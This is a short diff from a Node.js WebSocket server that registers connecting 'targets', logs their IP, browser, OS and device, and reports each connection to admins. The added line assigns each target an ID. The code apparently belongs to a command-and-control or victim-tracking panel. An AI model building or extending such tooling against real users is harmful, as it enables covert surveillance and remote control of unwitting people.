@@ -328,6 +328,7 @@ wss.on('connection', (ws, req) => {
           connectedAt: new Date().toISOString()
         };
         connectedTargets.set(clientId, { ...userInfo, ws });
+        ws.send(JSON.stringify({ type: 'ASSIGN_ID', clientId }));
         broadcastToAdmins({ type: 'TARGET_CONNECTED', user: userInfo });
         pushActivity('connect', `🟢 Target connected — IP: ${cleanIp} | ${parsed.browser} on ${parsed.os} (${parsed.device})`);
         break;
